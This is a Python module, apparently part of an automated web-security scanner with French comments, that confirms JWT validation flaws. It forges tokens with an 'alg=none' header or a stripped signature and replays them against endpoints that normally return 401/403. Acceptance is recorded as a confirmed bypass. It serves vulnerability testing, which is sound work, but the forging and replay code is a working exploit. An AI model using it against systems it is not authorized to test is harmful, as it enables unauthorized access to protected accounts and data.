"""
Confirmateur d'authentification (API2) — la logique de second ordre appliquée aux jetons.

`active_probes.probe_auth` fait des constats STATIQUES (token dans l'URL, JWT
sans `exp`, en-tête `alg=none`). Mais « le jeton contient alg=none » ne prouve
pas que le serveur l'ACCEPTE. Ce confirmateur tranche par la preuve : il forge un
jeton manipulé et le REJOUE sur un endpoint réellement protégé.

hypothèse (« la validation JWT est peut-être cassée ») → forge + rejeu → verdict

Attaques forgées (lecture seule, non destructives) :
- `alg=none` : en-tête {"alg":"none"}, signature vide → accepté = bypass total.
- signature retirée : même payload, signature vidée sous l'algorithme d'origine.

Preuve exigée (évite les faux positifs) :
- baseline : SANS jeton l'endpoint renvoie 401/403 (donc il est protégé) ;
- forge : AVEC le jeton forgé il renvoie 2xx → CONFIRMED (bypass) ; sinon REFUTED.
Si l'endpoint est déjà ouvert sans jeton, ce n'est pas un bypass JWT (REFUTED) —
c'est du ressort de la matrice d'accès.

L'endpoint protégé provient du modèle sémantique (une route vue en 401/403).
"""
import base64
import json
from dataclasses import dataclass
from typing import Callable, Dict, List, Optional

from ..utils import get_logger
from .investigation import Verdict, Evidence, CONFIRMED, REFUTED

logger = get_logger("llm.auth_confirmer")

SendFn = Callable[..., Dict]


def _b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b'=').decode()


def _decode_payload(token: str) -> Optional[Dict]:
    parts = token.split('.')
    if len(parts) < 2:
        return None
    try:
        return json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    except Exception:
        return None


def forge_alg_none(token: str) -> Optional[str]:
    """Reconstruit le jeton avec alg=none et signature vide, même payload."""
    payload = _decode_payload(token)
    if payload is None:
        return None
    header = _b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    body = _b64url(json.dumps(payload).encode())
    return f"{header}.{body}."          # signature vide


def forge_unsigned(token: str) -> Optional[str]:
    """Garde l'en-tête d'origine mais vide la signature."""
    parts = token.split('.')
    if len(parts) != 3:
        return None
    return f"{parts[0]}.{parts[1]}."


@dataclass
class AuthFinding:
    url: str
    technique: str
    verdict: Verdict

    def flat(self) -> Dict:
        return {'source': 'auth_confirmer', 'risk': 'Critical',
                'name': f"JWT bypass via {self.technique} accepted", 'url': self.url,
                'status': self.verdict.status, 'adjudication': self.verdict.source}


class AuthConfirmer:
    def __init__(self, send: SendFn, api_model=None):
        self.send = send
        self.api_model = api_model

    def protected_urls(self) -> List[str]:
        """Endpoints jugés protégés par le modèle : vus renvoyer 401/403."""
        urls: List[str] = []
        if self.api_model is None:
            return urls
        for r in self.api_model.routes.values():
            if r.method == 'GET' and any(s in (401, 403) for s in r.statuses):
                urls.append(r.sample_url)
        return urls

    def confirm(self, protected_url: str, token: str,
                auth_header: str = 'Authorization',
                scheme: str = 'Bearer ') -> List[AuthFinding]:
        """Forge et rejoue ; ne retient un verdict que si l'endpoint est protégé."""
        # Baseline : l'endpoint exige-t-il vraiment un jeton ?
        base = self.send('GET', protected_url) or {}
        base_status = int(base.get('status', 0))
        if 200 <= base_status < 300:
            # Ouvert sans jeton -> pas un bypass JWT.
            return [AuthFinding(protected_url, 'alg=none', Verdict(
                REFUTED, "endpoint reachable without any token (not a JWT bypass)",
                0.9, "deterministic"))]

        findings: List[AuthFinding] = []
        for technique, forge in (('alg=none', forge_alg_none),
                                 ('unsigned-signature', forge_unsigned)):
            forged = forge(token)
            if not forged:
                continue
            resp = self.send('GET', protected_url,
                             headers={auth_header: f"{scheme}{forged}"}) or {}
            st = int(resp.get('status', 0))
            ev = Evidence(request=f"GET {protected_url} [{technique}]",
                          response=f"status={st}", note=f"baseline no-token={base_status}")
            if 200 <= st < 300:
                findings.append(AuthFinding(protected_url, technique, Verdict(
                    CONFIRMED, f"forged {technique} token ACCEPTED on protected endpoint",
                    0.95, "deterministic", ev)))
                logger.info("jwt_bypass_confirmed", url=protected_url, technique=technique)
            else:
                findings.append(AuthFinding(protected_url, technique, Verdict(
                    REFUTED, f"forged {technique} rejected (status {st})",
                    0.9, "deterministic", ev)))
        return findings
